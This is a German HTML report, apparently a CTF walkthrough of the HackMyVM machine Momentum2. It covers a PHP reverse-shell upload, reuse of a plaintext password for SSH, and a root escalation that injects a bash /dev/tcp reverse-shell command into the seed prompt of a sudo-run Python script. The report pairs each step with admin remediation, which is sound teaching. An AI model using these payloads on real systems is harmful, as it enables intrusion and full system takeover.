@@ -1,0 +1,328 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Momentum2 - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Hintergrundfarbe wird durch CSS gesteuert -->
+    <div class="header-bg">
+        <h1>Momentum2 - HackMyVM - Medium - Bericht</h1> <!-- Titel angepasst -->
+        <!-- Schwierigkeitsgrad-Container mit Klasse für CSS-Styling -->
+        <div class="level-container level-medium"> <!-- Klasse angepasst -->
+            <!-- Kein Inline-Style mehr -->
+            <h2>Medium</h2> <!-- Schwierigkeitsgrad angepasst -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Kein Inline-Style mehr -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools werden hier eingefügt -->
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis wird hier eingefügt -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="evaluation"> Im bereitgestellten Text fehlen die initialen Reconnaissance-Schritte wie ARP-Scan, Nmap-Scan oder Hostnamen-Zuordnung. Der Bericht beginnt direkt mit der Analyse eines abgefangenen HTTP-Requests, was darauf hindeutet, dass die grundlegende Zielidentifikation (IP: 192.168.2.109 laut Burp-Request) und Port-Enumeration bereits stattgefunden haben müssen. </p>
+            <!-- Reconnaissance Inhalt endet hier -->
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Web Enumeration Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+POST /ajax.php HTTP/1.1
+<span class="command">Host: 192.168.2.109</span>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+<span class="command">Content-Type: multipart/form-data; boundary=---------------------------2893987342745606813665994749</span>
+Content-Length: 5717
+Origin: http://192.168.2.109
+Connection: close
+Referer: http://192.168.2.109/dashboard.html
+<span class="command">Cookie: admin=cookie</span>
+
+-----------------------------2893987342745606813665994749
+Content-Disposition: form-data; name="secure"
+
+<span class="password">val1d</span>
+-----------------------------2893987342745606813665994749
+Content-Disposition: form-data; name="file"; filename="<span class="command">rev.php</span>"
+Content-Type: application/x-php
+
+<!-- PHP-Tags wurden entfernt -->
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+
+-----------------------------2893987342745606813665994749--
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser mit Burp Suite abgefangene HTTP-Request zeigt einen POST-Request an die Datei `/ajax.php` auf dem Ziel `192.168.2.109`. Es handelt sich um einen `multipart/form-data`-Request, was typisch für Datei-Uploads ist.
+Zwei Formularfelder werden gesendet:
+1.  `secure`: mit dem Wert `val1d`. Dies könnte eine Art CSRF-Token oder eine Validierungsprüfung sein.
+2.  `file`: Enthält den Upload einer Datei namens `rev.php`. Der `Content-Type` ist als `application/x-php` angegeben, und der Inhalt (nach Entfernung der PHP-Tags) ist ein Kommentar, der auf eine PHP-Reverse-Shell hindeutet.
+Ein Cookie `admin=cookie` wird ebenfalls mitgesendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Hinweis auf eine Datei-Upload-Funktionalität über `ajax.php`, wahrscheinlich erreichbar über `/dashboard.html`. Die Möglichkeit, eine PHP-Datei hochzuladen, stellt ein hohes Risiko dar, da sie zu Remote Code Execution (RCE) führen kann, wenn die hochgeladene Datei anschließend ausgeführt werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob der Upload erfolgreich war und wo die Datei auf dem Server gespeichert wurde. Versuchen Sie, die hochgeladene Datei (`rev.php`) über den Webbrowser aufzurufen, um die Reverse Shell auszulösen. Richten Sie vorher einen Listener (z.B. `nc -lvnp PORT`) ein.
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Kontrollen für Datei-Uploads: Überprüfen Sie Dateitypen serverseitig (nicht nur anhand des `Content-Type`-Headers oder der Dateiendung), beschränken Sie Dateigrößen, speichern Sie hochgeladene Dateien außerhalb des Web-Roots oder in einem Verzeichnis ohne Ausführungsrechte, und benennen Sie hochgeladene Dateien zufällig um. Validieren Sie Eingaben wie den `secure`-Parameter serverseitig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+#
+
+browser:    <span class="command">http://192.168.2.109/owls/</span>
+meineShell: <span class="command">rev.php</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Notizen deuten darauf hin, dass die hochgeladene Datei `rev.php` im Verzeichnis `/owls/` auf dem Webserver gespeichert wurde und anschließend über die URL `http://192.168.2.109/owls/rev.php` im Browser aufgerufen wurde, um die Reverse Shell zu triggern.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den vermuteten Pfad und die Methode zur Ausführung des hochgeladenen Payloads.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den Browser-Aufruf durch, nachdem der Listener gestartet wurde.
+ <br><strong>Empfehlung (Admin):</strong> Verhindern Sie das Speichern von potenziell ausführbaren Dateien in web-zugänglichen Verzeichnissen oder konfigurieren Sie den Webserver so, dass er keine Skripte in diesen Verzeichnissen ausführt (z.B. durch Entfernen des Execute-Handlers für PHP in der Nginx/Apache-Konfiguration für das `/owls/`-Verzeichnis).</p>
+            <!-- Web Enumeration Inhalt endet hier -->
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Initial Access Inhalt beginnt hier -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[/home/darkspirit/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.131] from (UNKNOWN) [192.168.2.109] 45392</span>
+
+
+*
+                     </pre>
+                    <!-- Target shell prompt is missing initially, added based on context -->
+                    <pre>
+$
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System auf Port `9001` gestartet. Nach dem Aufruf der hochgeladenen `rev.php` im Browser geht eine Verbindung vom Zielsystem (`192.168.2.109`) ein. *Anmerkung: Die angezeigte Quell-IP `192.168.2.131` des Angreifers ist inkonsistent mit der späteren IP `192.168.2.140`.* Wir erhalten eine Shell-Prompt (`$`), die darauf hindeutet, dass der initiale Zugriff erfolgreich war.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Ausnutzung der Datei-Upload-Schwachstelle hat zu einer Reverse Shell geführt. Wir haben nun initialen Zugriff auf das System, wahrscheinlich als der Benutzer, unter dem der Webserver läuft (`www-data` oder ähnlich).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `whoami` und `id` aus, um den aktuellen Benutzer zu identifizieren. Stabilisieren Sie die Shell (z.B. mit Python PTY). Beginnen Sie mit der Enumeration des Systems aus der Sicht dieses Benutzers.
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Upload-Schwachstelle wie zuvor empfohlen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Prompt angenommen als www-data -->
+                    <pre>
+$<span class="command">www-data: cat password-reminder.txt</span>
+
+<span class="password">password : myvulnerableapp*</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Shell wird eine Datei namens `password-reminder.txt` gefunden und ihr Inhalt ausgelesen. Die Datei enthält den Text `password : myvulnerableapp*`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger Fund. Es handelt sich wahrscheinlich um ein Passwort, das auf dem System wiederverwendet wird, möglicherweise für den Benutzer `athena`, der im nächsten Schritt per SSH angegriffen wird. Das `*` am Ende könnte Teil des Passworts sein oder ein Artefakt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, dieses Passwort (`myvulnerableapp*`) für den SSH-Login des Benutzers `athena` (oder andere gefundene Benutzer) zu verwenden.
+ <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder Erinnerungen daran im Klartext in Dateien auf dem System. Schulen Sie Benutzer darin, sichere Passwortpraktiken anzuwenden und keine Passwort-Erinnerungen ungesichert abzulegen.</p>
+            <!-- Initial Access Inhalt endet hier -->
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Privilege Escalation Inhalt beginnt hier -->
+            <p class="analysis"><strong>Strategie Teil 1: Von `www-data` zu `athena`</strong></p>
+            <p class="analysis">Der nächste Schritt ist die Eskalation vom Webserver-Benutzer (`www-data`) zu einem regulären Benutzer (`athena`), wahrscheinlich unter Verwendung des gefundenen Passworts.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh athena@mom.hmv</span></div>
+                     <pre>
+The authenticity of host 'mom.hmv (192.168.2.144)' can't be established.
+ED25519 key fingerprint is SHA256:aVUkKd3or0Ml25d7E6p9nRDjyvlHUFPmrhZnutzxW80.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'mom.hmv' (ED25519) to the list of known hosts.
+athena@mom.hmv's password: <span class="password">myvulnerableapp*</span>
+
+                     </pre>
+                     <!-- Prompt nach erfolgreichem Login -->
+                     <div class="prompt">athena@momentum2:~$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung zum Host `mom.hmv` (aufgelöst zu `192.168.2.144`) als Benutzer `athena` versucht. *Anmerkung: Dies ist ein anderer Hostname/IP als der ursprüngliche Zielhost (`192.168.2.109`). Dies könnte ein Fehler im Bericht sein oder auf eine Multi-Host-Umgebung hindeuten. Der spätere Prompt `athena@momentum2` passt jedoch zum Maschinennamen.* Nach Bestätigung des Host-Keys wird das zuvor gefundene Passwort `myvulnerableapp*` eingegeben, was zum erfolgreichen Login führt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das in der `password-reminder.txt` gefundene Passwort war gültig für den SSH-Login des Benutzers `athena`. Die Rechte wurden erfolgreich vom `www-data`-Kontext auf den `athena`-Benutzer eskaliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsschritte als Benutzer `athena` durch: Prüfen Sie `sudo -l`, suchen Sie nach SUID/GUID-Dateien, überprüfen Sie Cronjobs, durchsuchen Sie das Home-Verzeichnis nach interessanten Dateien oder Konfigurationen. Erfassen Sie das User-Flag.
+ <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, einzigartige Passwörter für alle Benutzer. Vermeiden Sie Passwort-Wiederverwendung. Deaktivieren Sie ungenutzte Benutzerkonten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">athena@momentum2:~$ <span class="command">cat user.txt</span></div>
+                     <pre>
+/                         \
+~ Momentum 2 ~ User wned ~
+\                         /
+
+---------------------------------------------------
+FLAG : <span class="password">4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw</span>
+---------------------------------------------------
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `athena` wird die Datei `user.txt` gefunden und der Inhalt (das User-Flag) ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag wurde erfolgreich erfasst.</p>
+
+            <p class="analysis"><strong>Strategie Teil 2: Von `athena` zu `root`</strong></p>
+            <p class="analysis">Nun wird nach einem Weg gesucht, um von `athena` zu `root`-Rechten zu gelangen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">athena@momentum2:~$ <span class="command">sudo /usr/bin/python3 /home/team-tasks/cookie-gen.py</span></div>
+                     <pre>
+~ Random Cookie Generation ~
+[!] for security reasons we keep logs about cookie seeds.
+Enter the seed : <span class="password">`bash -c "bash -i >& /dev/tcp/192.168.2.140/9001 0>&1"`</span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `athena` führt das Python-Skript `/home/team-tasks/cookie-gen.py` mit `sudo` aus. Dies impliziert, dass `athena` über `sudo -l` (obwohl nicht gezeigt) die Berechtigung hat, genau dieses Skript als `root` auszuführen. Das Skript fordert zur Eingabe eines "seed"-Wertes auf. Anstatt eines normalen Seeds wird hier eine OS-Command-Injection versucht: Der String `` `bash -c "bash -i >& /dev/tcp/192.168.2.140/9001 0>&1"` `` wird eingegeben. Die Backticks (`) bewirken, dass der eingeschlossene Befehl von der Shell ausgeführt wird, bevor sein Output als Seed verwendet wird. Der Befehl selbst baut eine interaktive Bash-Reverse-Shell zum Angreifer-System (`192.168.2.140`) auf Port `9001` auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer Fall von Privilege Escalation durch unsichere `sudo`-Rechte kombiniert mit Command Injection. Das Python-Skript verwendet den Benutzereingabe-Seed wahrscheinlich unsicher (z.B. übergibt ihn direkt an eine Shell-Funktion wie `os.system` oder `subprocess.call` mit `shell=True`), was die Injection ermöglicht. *Anmerkung: Erneut eine inkonsistente Angreifer-IP (`192.168.2.140`).*</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Listener auf `192.168.2.140:9001`, bevor Sie den Payload eingeben. Führen Sie den `sudo`-Befehl aus und geben Sie den Command-Injection-Payload ein, um die Root-Shell zu erhalten.
+<br><strong>Empfehlung (Admin):</strong> Vergeben Sie `sudo`-Rechte äußerst restriktiv. Erlauben Sie niemals das Ausführen von Skripten als `root`, die unvalidierte Benutzereingaben entgegennehmen und in potenziell gefährlichen Operationen (wie Shell-Befehlen) verwenden. Überprüfen Sie den Code von `/home/team-tasks/cookie-gen.py` und beheben Sie die Command-Injection-Schwachstelle durch korrekte Validierung und sichere Handhabung des Seeds (z.B. keine direkte Übergabe an eine Shell).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.144] 54736</span>
+bash: initialize_job_control: no job control in background: Bad file descriptor
+                     </pre>
+                     <!-- Prompt der Root-Shell -->
+                     <div class="prompt">root@momentum2:/home/athena#</div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf dem Angreifer-System (`192.168.2.140`, Port `9001`) empfängt die eingehende Verbindung vom Zielsystem (`192.168.2.144`, Hostname `momentum2`). Eine Root-Shell (`root@momentum2#`) wird erhalten. Die Meldung `bash: initialize_job_control...` ist typisch für einfache Reverse Shells.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Rechteausweitung auf `root` durch Ausnutzung der unsicheren `sudo`-Regel und Command Injection im Python-Skript war erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell, falls nötig. Suchen und erfassen Sie das Root-Flag (`/root/root.txt`).
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie die `sudo`-Fehlkonfiguration und die Command-Injection-Schwachstelle im Skript.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@momentum2:/home/athena# <span class="command">cat roo	</span></div> <!-- Annahme: Tab-Vervollständigung -->
+                    <div class="prompt">root@momentum2:/home/athena# <span class="command">cat root.txt</span></div>
+                     <pre>
+//                    \\
+}  Rooted - Momentum 2 {
+\\                    //
+
+---------------------------------------------------
+FLAG : <span class="password">4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG</span>
+---------------------------------------------------
+
+
+by Alienum with <3
+                     </pre>
+                      <div class="prompt">root@momentum2:</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird die Datei `/root/root.txt` (vermutlich im `/root`-Verzeichnis, obwohl der `cd`-Befehl nicht gezeigt wird) ausgelesen und das Root-Flag wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Root-Flag wurde erfolgreich erfasst. Das Ziel der Maschine ist erreicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und den Angriffspfad. Führen Sie ggf. Bereinigungsmaßnahmen durch.
+ <br><strong>Empfehlung (Admin):</strong> Sichern Sie die Maschine, indem Sie die identifizierten Schwachstellen (unsicherer Datei-Upload, Passwort im Klartext, unsichere sudo-Regel, Command Injection) beheben.</p>
+            <!-- Privilege Escalation Inhalt endet hier -->
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept: Privilege Escalation via Sudo Command Injection</h2>
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `athena` ist berechtigt, das Python-Skript `/home/team-tasks/cookie-gen.py` mittels `sudo` als `root` auszuführen. Dieses Skript nimmt einen "seed"-Wert als Benutzereingabe entgegen und verwendet diesen unsicher, was eine OS-Command-Injection ermöglicht. Durch die Eingabe eines speziell präparierten Strings, der einen Reverse-Shell-Befehl enthält (eingeschlossen in Backticks `` ` ``), kann ein Angreifer mit `athena`-Rechten eine Root-Shell auf dem System erlangen.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>SSH-Zugriff als Benutzer `athena`.</li>
+                     <li>Die spezifische `sudo`-Regel, die `athena` erlaubt, `/usr/bin/python3 /home/team-tasks/cookie-gen.py` als `root` auszuführen.</li>
+                     <li>Ein Listener (z.B. Netcat) auf dem Angreifer-System.</li>
+                 </ul>
+             </p>
+             <p class="analysis"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                     <li>Starte einen Listener auf dem Angreifer-System auf einem freien Port (z.B. `nc -lvnp 9001`).</li>
+                     <li>Logge dich per SSH als `athena` auf dem Zielsystem ein.</li>
+                     <li>Führe den folgenden Befehl aus: `sudo /usr/bin/python3 /home/team-tasks/cookie-gen.py`</li>
+                     <li>Wenn das Skript nach dem "seed" fragt, gib den folgenden Payload ein (ersetze `[Angreifer-IP]` durch die IP-Adresse des Angreifer-Systems und `[Port]` durch den Port des Listeners): `` `bash -c "bash -i >& /dev/tcp/[Angreifer-IP]/[Port] 0>&1"` ``</li>
+                 </ol>
+             </p>
+             <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Befehl innerhalb der Backticks wird als `root` ausgeführt. Eine Bash-Reverse-Shell verbindet sich zum Listener des Angreifers.</p>
+             <p class="recommendation"><strong>Beweismittel:</strong> Eingehende Verbindung auf dem Netcat-Listener, Ausführung des `id`-Befehls in der erhaltenen Shell zeigt `uid=0(root)`.</p>
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Diese Schwachstelle erlaubt einem Benutzer mit spezifischen, aber niedrigeren Rechten (`athena`), vollständige Root-Kontrolle über das System zu erlangen.</p>
+             <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                 <ul>
+                     <li>Überprüfen Sie alle `sudo`-Regeln und entfernen Sie unnötige oder unsichere Berechtigungen.</li>
+                     <li>Erlauben Sie niemals das Ausführen von Skripten als `root` über `sudo`, wenn diese Skripte Benutzereingaben unsicher verarbeiten (z.B. direkte Übergabe an Shell-Funktionen).</li>
+                     <li>Validieren und sanitisieren Sie jegliche Benutzereingabe rigoros, bevor sie in potenziell gefährlichen Kontexten verwendet wird.</li>
+                     <li>Erwägen Sie den Einsatz von Werkzeugen zur statischen Code-Analyse, um Command-Injection-Schwachstellen im Code zu identifizieren.</li>
+                 </ul>
+            </p>
+        </section>
+
+        <!-- Flags Section (Korrekte Struktur gemäß Regeln) -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div> <!-- Kommando angenommen -->
+                    <div class="flag-value"><span class="password">4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw</span></div> <!-- Flag aus Text -->
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div> <!-- Kommando angenommen -->
+                    <div class="flag-value"><span class="password">4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG</span></div> <!-- Flag aus Text -->
+                </div>
+            </div>
+        </section>
+        <!-- Ende Flags Section -->
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: [Datum - nicht im Text gefunden]</p> <!-- Datum Platzhalter -->
+    </footer>
+</body>
+</html>
